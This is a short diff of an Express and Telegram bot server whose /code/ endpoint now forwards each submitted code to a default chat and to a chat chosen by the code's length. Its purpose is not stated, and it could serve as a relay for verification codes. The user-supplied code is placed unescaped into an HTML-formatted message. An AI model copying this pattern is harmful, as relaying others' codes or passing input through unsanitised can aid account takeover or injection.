@@ -16,8 +16,8 @@ app.use(express.json());
 
 app.post("/code/", (req, res) => {
     const code = req.body.code.trim();
-    const chatId = getSenderByCodeLength(code.length)
-    bot.telegram.sendMessage(chatId, `Code: <code>${code.toString()}</code>`, {parse_mode: "HTML"}).catch(err => console.log(err))
+    const chatIds = getSendersByCodeLength(code.length)
+    chatIds.forEach(chatId => bot.telegram.sendMessage(chatId, `Code: <code>${code.toString()}</code>`, {parse_mode: "HTML"}).catch(err => console.log(err)));
     res.sendStatus(200);
 });
 
@@ -100,9 +100,12 @@ function updateSender(chatId, payload) {
 
 const getSenders = () => JSON.parse(fs.readFileSync(senderFilePath, "utf-8"))
 
-function getSenderByCodeLength(codeLength) {
-    const senders = getSenders();
-    return senders?.[codeLength] ?? senders["default"]
+function getSendersByCodeLength(codeLength) {
+    const allSenders = getSenders();
+    const senders = [allSenders["default"]]
+    const sender = allSenders?.[codeLength]
+    if (sender) senders.push(sender)
+    return senders
 }
 
 const getPayload = () => JSON.parse(fs.readFileSync(payloadFilePath, "utf-8"))
